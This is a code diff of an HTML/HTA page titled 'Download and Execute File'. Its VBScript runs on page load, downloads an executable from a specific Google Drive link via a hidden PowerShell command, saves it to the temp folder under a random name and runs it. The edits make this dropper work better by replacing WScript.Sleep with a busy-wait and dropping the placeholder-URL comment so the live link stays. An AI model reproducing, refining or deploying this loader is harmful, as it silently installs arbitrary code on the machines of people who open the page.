@@ -6,27 +6,36 @@
     <title>Download and Execute File</title>
     <script type="text/vbscript">
         Sub Window_onLoad
-            Window.resizeTo 1, 1
-            Window.MoveTo -32000, -32000
+            ' Window.resizeTo 1, 1
+            ' Window.MoveTo -32000, -32000
             Call CreateObject("MSXML2.XMLHTTP").Open("GET", "https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H", False)
             Call CreateObject("MSXML2.XMLHTTP").Send()
-            
+
             Dim objShell, tempFolder, downloadUrl, randomFileName, downloadedFile
             Set objShell = CreateObject("WScript.Shell")
             tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
-            downloadUrl = "https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H" ' Replace with actual URL
+            downloadUrl = "https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H"
             randomFileName = "downloaded" & Int((1000) * Rnd) & ".exe"
             downloadedFile = tempFolder & "\" & randomFileName
 
             cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri " & downloadUrl & " -OutFile " & downloadedFile & """"
             objShell.Run "cmd.exe /c " & cmdCommand, 0, True
 
-            Set fso = CreateObject("Scripting.FileSystemObject")
-            Do Until fso.FileExists(downloadedFile)
-                WScript.Sleep 1000
+            Do Until FileExists(downloadedFile)
+                Dim startTime
+                startTime = Timer
+                Do While Timer < startTime + 1
+                    
+                Loop
             Loop
+
             objShell.Run downloadedFile
         End Sub
+
+        Function FileExists(filePath)
+            Set fso = CreateObject("Scripting.FileSystemObject")
+            FileExists = fso.FileExists(filePath)
+        End Function
     </script>
 </head>
 <body>
